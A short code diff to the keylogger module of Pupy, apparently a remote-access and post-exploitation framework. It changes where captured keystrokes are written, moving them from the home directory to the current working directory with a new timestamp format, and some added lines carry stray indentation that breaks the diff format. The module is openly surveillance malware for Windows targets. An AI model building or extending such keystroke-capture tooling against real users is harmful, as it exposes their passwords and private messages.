@@ -9,7 +9,8 @@ import struct
 import traceback
 import time
 from pupylib.utils.rpyc_utils import redirected_stdio
-
+import datetime
+import os
 __class_name__="KeyloggerModule"
 
 @config(compat="windows", cat="gather")
@@ -44,12 +45,18 @@ class KeyloggerModule(PupyModule):
 				return
 			if args.action=="dump":
 				self.success("dumping recorded keystrokes :")
-				date      = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-				dump_file = os.path.expanduser('~/keystrokes_' + str(date) + '.txt')
-				f         = open(dump_file,'w')
-				f.write(self.keylogger.dump())
-				f.close()
-				self.success("File saved in: " + dump_file + "\n")
+
+				"""
+				   * Save the keystrokes in a file inside the current working directory.
+				"""
+				date      = datetime.datetime.now().strftime("%Y-%m-%d %H-%M-%S")
+				filename  = 'keystrokes_' + str(date) + '.txt'
+ 				dump_file = os.path.join(os.getcwd(), filename)
+ 				f         = open(dump_file,'w')
+ 				f.write(self.keylogger.dump())
+ 				f.close()
+  				self.success("File saved in: " + dump_file + "\n")
+
 				self.log(self.keylogger.dump())
 			elif args.action=="stop":
 				self.keylogger.stop()
